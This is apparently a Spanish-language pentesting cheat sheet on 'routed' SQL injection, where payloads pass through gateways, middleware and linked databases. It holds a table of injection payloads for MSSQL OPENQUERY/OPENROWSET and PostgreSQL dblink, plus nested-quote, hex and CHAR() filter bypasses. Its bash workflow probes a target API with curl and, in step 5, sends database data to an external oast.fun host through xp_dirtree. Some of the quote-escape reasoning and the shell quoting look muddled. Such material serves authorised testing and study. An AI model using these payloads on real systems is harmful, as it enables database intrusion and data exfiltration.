---
aliases:
  - Routed SQLi
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi - Routed

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT * FROM OPENQUERY(LinkedTargetDB, 'SELECT * FROM users WHERE id=1'' OR ''1''=''1')` | MSSQL pasa query a backend linked via OpenQuery — inyectar dentro de comillas anidadas | MSSQL frontend con linked server. |
| `SELECT * FROM OPENROWSET('SQLNCLI','Server=linked;UID=sa;PWD=pwd','SELECT * FROM users WHERE id=1'' OR ''1''=''1')` | MSSQL OpenRowset con auth explícita | Linked sin OPENQUERY config. |
| `SELECT dblink('host=target dbname=postgres user=postgres','SELECT * FROM users WHERE id=1'' OR ''1''=''1') AS t(c text)` | PostgreSQL dblink con SQLi anidado | PostgreSQL dblink extension. |
| `{"tenant_id":"5","query":"1' OR '1'='1"}` | Payload se pasa por gateway → middleware → backend DB — inyección en field `query` | API gateway con campo SQL pasado a backend. |
| Quote escape doble: `''''` (4 comillas → backend recibe `''` → ejecuta como `'`) | Sobrevivir 2 niveles de quoting | Cada hop unescape una vez. |
| Quote escape triple: `''''''''` (8 comillas → `'`) | Sobrevivir 3 niveles de quoting | 3 hops de unescape. |
| `0x53454c454354202a2046524f4d207573657273` (hex de `SELECT * FROM users`) | Bypass de quote-escaping con hex en MSSQL | MSSQL acepta `EXEC` con hex string. |
| `CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)` (construir `SELECT` por chars) | Bypass de filtros sobre keywords literales | Filtros estrictos en hops intermedios. |
^sqli-routed

### Workflow

```bash
TARGET="https://target/api/proxy"

# 1. Identificar arquitectura — recon
curl -sI "$TARGET" | grep -iE 'server|x-powered-by|x-routing|x-gateway'

# 2. Probe básico — confirmar SQLi en field "query"
PAYLOAD='{"tenant_id":"5","query":"1 OR 1=1"}'
curl -X POST "$TARGET" -H 'Content-Type: application/json' -d "$PAYLOAD"

# 3. Si gateway escapa comillas — usar double-escape
PAYLOAD='{"tenant_id":"5","query":"1'\'''\'' OR '\'''\''1'\'''\''=\'\''1"}'
# Cuádruples comillas dentro del JSON

# 4. Si hops intermedios escapan más → CHAR/hex
PAYLOAD='{"tenant_id":"5","query":"1 OR USER LIKE CHAR(97)"}'

# 5. Exfil via OOB cuando el backend es inaccesible directamente
PAYLOAD='{"tenant_id":"5","query":"1; EXEC master..xp_dirtree '\''\\\\\\\\'\'+CAST((SELECT @@version) AS varchar(100))+'\'.CANARY.oast.fun\\x'\''-- -"}'
```

### Mapeo de hops

```
[Gateway] → escape ' = \'        (1 nivel)
    ↓
[Middleware] → escape \' = \\'    (2 niveles)
    ↓
[Linked SGBD] → unescape → '      (back to 1 quote)
    ↓
[Target SGBD] → ejecuta            (vulnerable)
```

Para sobrevivir 2 hops, payload original = `''''` (4 quotes literales).

---

## Overview

**Routed SQLi** = payload viaja por N hops (gateway → middleware → linked DB → target DB) antes de ejecutarse. Cada hop unescape/re-escape el string. Atacante debe construir payload que **sobreviva todas las capas** intactas.

**Vectores comunes:**
- MSSQL `OPENQUERY`/`OPENROWSET` a linked server.
- PostgreSQL `dblink`.
- Microservicios con API gateway que reenvía a workers SQL.
- ETL pipelines que pasan filter strings entre componentes.

**Desafío clave:** quote-escaping anidado. 1 hop = `''`, 2 hops = `''''`, 3 hops = `''''''''`. Alternativa: hex literals (`0x...`) o `CHAR()` concat que evade todos los escapes.

**Confirmación:** vector típicamente blind — el target backend no devuelve respuesta directa. Pivotar a [[SQLi - Out of Band]] o [[SQLi - Time based]] post-detection.

---
